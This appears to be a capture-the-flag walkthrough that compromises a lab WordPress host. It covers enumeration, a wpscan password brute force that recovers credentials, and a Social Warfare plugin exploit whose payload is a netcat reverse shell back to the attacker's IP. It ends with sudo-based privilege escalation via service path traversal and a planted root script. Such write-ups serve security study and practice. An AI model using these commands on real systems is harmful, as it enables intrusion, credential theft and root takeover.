nmap shows ports 22 and 80

visiting port 80 just says the text "so simple"
gobuster on port 80 gives /wordpress
gobuster on /wordpress gives a bunch, like /xmlrpc.php /wp-trackback.php - the interesting of a few

```zsh
wpscan --url http://192.168.105.78/wordpress
#shows an outdated plugin social-warefare being run
#searchsploit shows an exploit for it
wpscan --url http://192.168.105.78/wordpress --enumerate u
#shows user "max"
#no hits on max's ssh brute force

wpscan --url http://192.168.105.78/wordpress --usernames max --passwords /usr/share/wordlists/rockyou.txt
#gives creds max : opensesame
#dint have to
```

```zsh
searchsploit social warfare
searchsploit -m php/webapps/46794.py

#Looking at the exploit, it seemed like we need to host a "payload.txt" on local python server, but did not know the format. So followed the github link in the exploit
#<pre> busybox nc 192.168.45.240 80 -e /bin/sh<pre>
python2 46794.py --target http://192.168.105.78/wordpress/ --payload-uri http://192.168.45.240:8000/payload.txt
#gives us shell as www-data
#in hindsight, we could've just gone to max's home, gotten his id_rsa and ssh'ed in as max
#which is what we do, once we get shell as www-data 
```
max!

```zsh
sudo -l
#shows we can run sudo -u steven /usr/sbin/service
sudo -u steven /usr/sbin/service ../../bin/bash
#gives shell as steven

#steven!
sudo -l
#shows we can run /opt/tools/server-health.sh as root
#This file is non-existent
#we have permission to write in /opt
cd opt
mkdir tools
cd tools
echo "/bin/bash -p" > server-health.sh
chmod +x server-health.sh
sudo /opt/tools/server-health.sh
```
 
